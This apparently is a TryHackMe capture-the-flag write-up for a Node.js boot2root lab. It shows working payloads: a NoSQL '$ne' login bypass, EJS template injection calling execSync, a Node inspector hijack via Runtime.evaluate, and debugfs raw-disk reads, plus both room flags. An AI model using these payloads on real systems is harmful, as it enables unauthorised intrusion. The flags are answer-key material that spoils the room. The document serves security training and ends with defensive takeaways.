---
title: Do Not Disturb
category: Web / Boot2Root
difficulty: Medium
platform: TryHackMe
date: 2026-08-03
tags: [TryHackMe, Web, Boot2Root, Node.js, Medium]
summary: "The Byte Lotus poolside platform hides an exposed Node.js inspector port. Following the intruder's footprints to a shell, then escalating through raw disk access."
---

# The Byte Lotus Hotel — Boot2Root
## Room Summary
The Byte Lotus poolside platform tracks every cabana, sunbed and warm session. Someone is already inside — the goal is to follow the intruder’s footprints in, climb the way they climbed, and recover both flags. The machine runs a Node.js (Express) web app with an exposed Node.js inspector port, and the final escalation is achieved via raw disk access.

## Flags
```bash
THM{w4rm_s3ss10n_h1j4ck3d}
```

```bash
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

A full port scan revealed only two open services:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu (Ubuntu Linux)
80/tcp open  http    Node.js (Express middleware)
The web root (http://10.48.177.169/) is a login page for the Byte Lotus poolside
```

platform. Directory fuzzing found:

```bash
/staff — 403 (staff console, access controlled)
```

```bash
/logout — 302
```

## 2. NoSQL Injection on the Login
```bash
The login endpoint /login accepts JSON (Express + express.json()), which is a
```

classic sign of a document database (NeDB here). Operator injection into the query bypasses authentication:

```bash
POST /api/login HTTP/1.1
Host: 10.48.177.169
Content-Type: application/json
```

```bash
{"username":{"$ne":"guest"},"password":{"$ne":null}}
HTTP/1.1 200 OK
{"ok":true,"role":"staff"}
Set-Cookie: connect.sid=s%3A...; Path=/; HttpOnly
Excluding guest forces the query to match the attendant account, which has the
staff role. With this session cookie, /staff returns the Cabana Desk console.
```

## 3. EJS Server-Side Template Injection (SSTI) → RCE as poolside
The staff console has a Confirmation template textarea (EJS) with a preview feature. EJS renders the template server-side, so an EJS expression is executed:

```bash
POST /staff/preview
Cookie: connect.sid=s%3A...
template=<%=
process.mainModule.require('child_process').execSync('id').toString() %>
<pre>uid=996(poolside) gid=996(poolside) groups=996(poolside)</pre>
RCE as poolside confirmed. The user.txt flag was read from the service
```

account’s home directory:

```bash
$ cat /home/poolside/user.txt
THM{w4rm_s3ss10n_h1j4ck3d}
```

## 4. Node.js Inspector Hijack → RCE as pipelinesvc
Process enumeration revealed the telemetry service running with the inspector enabled:

```bash
USER         PID ... COMMAND
pipelin+     600 ... /usr/bin/node --inspect=127.0.0.1:9229 processor.js
poolside     602 ... /usr/bin/node app.js
The lotus-telemetry.service unit confirms it:
[Service]
User=pipelinesvc
Group=pipelinesvc
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 processor.js
The Node.js inspector (Chrome DevTools Protocol) was bound to 127.0.0.1:9229
```

- accessible from the box itself, but not externally. This is the room’s “warm

```bash
session”: a debugging session running as pipelinesvc.
A small WebSocket client (Node 22 native WebSocket) was uploaded to /tmp and
used to evaluate JavaScript inside the processor.js process via
Runtime.evaluate:
```

```bash
GET http://127.0.0.1:9229/json/list
ws = new WebSocket(target.webSocketDebuggerUrl);
ws.send({id:1, method:"Runtime.evaluate", params:{
  expression:
`process.mainModule.require('child_process').execSync(Cmd).toString()`,
  returnByValue:true, awaitPromise:true }});
$ node /tmp/eval_ws.js 'id'
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
RCE as pipelinesvc — and notably the account belongs to the disk group.
```

## 5. Raw Disk Access → Root Flag
```bash
With the disk group, the raw root filesystem block device is readable (brw-
rw---- root disk /dev/nvme0n1p1). Filesystem permissions can be bypassed
entirely by reading files straight off the disk with debugfs:
$ debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1
debugfs 1.47.0 (5-Feb-2023)
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

## 6. Attack Chain Summary
# Step Result
Authenticat 1

```bash
NoSQL injection ($ne) on /api/login
ed as staff
```

```bash
EJS SSTI in /staff/preview
poolside
Node inspector on 127.0.0.1:9229 via
```

```bash
CDP Runtime.evaluate
pipelinesvc
disk group + debugfs raw partition
```

4 Root flag read

## 7. Key Takeaways
```bash
JSON login endpoints should treat operators ($ne, $gt, $regex...) as
```

• untrusted — use parameterised/typed queries against document databases.

```bash
Never run ejs.render() on user input; template engines are Turing-
```

• complete on the server.

```bash
Never leave --inspect on a loopback-bound service; local users can still
```

• reach it (and even reverse-tunnel to it externally).

```bash
The disk group on Linux is effectively root — group membership should
```

• be audited for service accounts.
